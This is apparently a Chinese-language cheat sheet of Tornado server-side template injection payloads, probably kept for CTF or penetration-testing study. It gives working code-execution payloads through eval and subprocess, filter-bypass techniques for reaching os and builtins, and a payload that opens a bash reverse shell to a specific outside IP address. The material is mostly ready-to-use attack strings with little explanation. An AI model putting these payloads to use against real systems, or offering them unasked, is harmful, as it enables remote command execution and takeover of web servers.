# 常见payload
	- ```python
	  {{handler.settings}}
	  {{eval('[].__class__.__mro__[1].__subclasses__()[231]("ls",shell=1,stdout=-1).communicate()')}}
	  ```
- # 代码注入
	- ```
	  {% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
	  ```
- # WAF绕过
	- 读取文件
		- `{%extends xxx%}`
		- `include`
	- 括号
		- `{%raw 114%}`输出表达式，配合apply可以实现函数调用绕过括号
			- 可以直接将字符串传给eval
			- `{%apply x.append%}{%raw {114:1}[k]%}{%end%}`
		- `_tt_utf8`
			- ```
			  ssti={%25 set _tt_utf8 =eval %25}{%25 raw request.body_arguments[request.method][0] %25}&POST=import(‘os’).popen(“bash -c ‘bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F23.224.22.11%2F7777%20%3C%261’”)
			  ```
	- 获取危险函数
		- ``handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']``
		- `{%import os%}`
		- 命名空间里有datetime模块,也就是说可以拿到sys模块`datetime.sys`
			- 然后就可以使用`sys.modules`拿到已经加载的模块
			- ``datetime.sys.modules["os"].system``
			- ```python
			  namespace = {
			    "escape": escape.xhtml_escape,
			    "xhtml_escape": escape.xhtml_escape,
			    "url_escape": escape.url_escape,
			    "json_encode": escape.json_encode,
			    "squeeze": escape.squeeze,
			    "linkify": escape.linkify,
			    "datetime": datetime,
			    "_tt_utf8": escape.utf8,  # for internal use
			    "_tt_string_types": (unicode_type, bytes),
			    # __name__ and __loader__ allow the traceback mechanism to find
			    # the generated source code.
			    "__name__": self.name.replace(".", "_"),
			    "__loader__": ObjectDict(get_source=lambda name: self.code),
			  }
			  ```
			-
	- 构造字符串
		- `handler.get_argument`拿到某个GET参数
			- ``handler.get_argument('yu')``
		- `request.method`请求方法
		- `request.arguments`POST（也许也有GET？）参数的字典，但是值是一堆bytes
		- `request.files`上传文件的字典
		- `request.headers`里面可以拿到^^字符串形式的Headers^^
		- `datetime.sys.base_exec_prefix`是一个字符串
		- `datetime.sys.builtin_module_names`有一堆字符串
		- 利用列表从一个字典中取出所有的值，可以用来从headers字典中取出字符串
			- ```
			  {%set x=[]%}
			  {%for k in {114:514}%}
			  {%apply x.append%}{%raw {114:1}[k]%}{%end%}
			  {%end%}
			  ```
			- ```
			  {%set x=[]%}
			  {%set d={114:514}%}
			  {%set g=iter(d)%}
			  {%try%}
			  {%while 1%}
			  {%apply x.append%}{%raw next(g)%}{%end%}
			  {%end%}
			  {%except%}
			  {%end%}
			  ```
	- 其他
		- `extends`渲染另一个模板
- # 参考
	- https://xz.aliyun.com/t/12260#toc-10
	- https://blog.csdn.net/miuzzx/article/details/123329244